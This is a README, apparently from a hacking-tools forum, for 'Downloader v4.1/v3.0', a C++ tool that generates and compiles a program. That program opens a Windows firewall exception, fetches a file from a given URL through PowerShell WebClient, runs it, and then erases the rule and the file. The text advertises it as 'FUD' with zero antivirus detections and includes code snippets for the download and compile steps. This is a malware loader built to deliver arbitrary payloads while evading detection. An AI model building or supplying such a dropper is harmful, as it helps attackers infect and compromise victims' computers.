# Downloader v4.1 by dEEpEst

Downloader v4.1 by dEEpEst is a C++ program that simplifies the process of downloading a file from a specified URL, running the file, and creating a firewall exception for the downloaded file.

## Introduction

The tool can be especially useful for managing downloads and ensuring security rules are correctly applied to them.

## Functionality

Upon execution, the program will:

1. Ask for a URL to download the file from.
2. Ask for the name of the file.
3. Ask for the name of the Firewall rule.
4. Ask for the Visual Studio compiler route.
5. Generate a new .cpp file that contains code to create a firewall exception, download the file, run it, and remove both the firewall exception and file after use.
6. Compile and run this new .cpp file.

## Code Structure

The main components of the program are:

- `print_header()`: Prints the ASCII art header and program details.
- `class DescargaYRegla`: Handles the generation and compilation of a new C++ file.
    - `generarArchivo()`: Generates a new .cpp file.
    - `compilarArchivo()`: Compiles the new .cpp file into an executable.
- `replaceSingleBackslashWithDouble()`: Utility function to escape backslashes in paths.
- `main()`: Takes user input for the required parameters and starts the process.

## Code Snippets

### Class Constructor

```cpp
DescargaYRegla(std::string url, std::string archivo, std::string regla, std::string rutaCompilador)
    : url(url), archivo(archivo), regla(regla), rutaCompilador(rutaCompilador) {
    generarArchivo();
    compilarArchivo();
}
```

### Generate a new .cpp file

```void generarArchivo() {
    ...
    out << "if(system(\"powershell -Command \\\"(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + archivo + "')\\\"\") != 0) {\n";
    ...
}
```

### Compile new .cpp file

```void compilarArchivo() {
    ...
    bat_file << "call \"" + rutaCompilador + "\\VsDevCmd.bat\"\n";
    bat_file << "cl /EHsc new_code.cpp /Fe:new_code.exe\n";
    ...
}
```

## Usage

```Downloader.exe <URL> <file_name> <firewall_rule> <compiler_route>```

## Dependencies

Visual Studio: It should be installed and ```cl.exe``` should be in your system's PATH.

## License

This project is licensed under the MIT License.

## Links

- [Github Repository](https://github.com/LvL23HT/Downloader_by_dEEpEst)
- [Home](https://level23hacktools.com)

---
***
---

# Downloader v3.0 by dEEpEst - Source Code - FUD - C++ - Powershell
This is a downloader I wrote in C++ Which runs Powershell commands , it creates a rule in the Firewell to allow connections and it downloads a file from the internet and runs it. 
As you can see also delete the rule and delete the file.

The file is FUD , 0 detections of the AV's 

![image](https://user-images.githubusercontent.com/130660521/235003522-a03e34d6-b9e8-4103-9903-a2e212bf1649.png)


It's just the beginning of a project, I will improve the functionality and update it.

Of course as always it is for educational purposes.


You can see me here https://level23hacktools.com/hackers/profile/1-deepest/
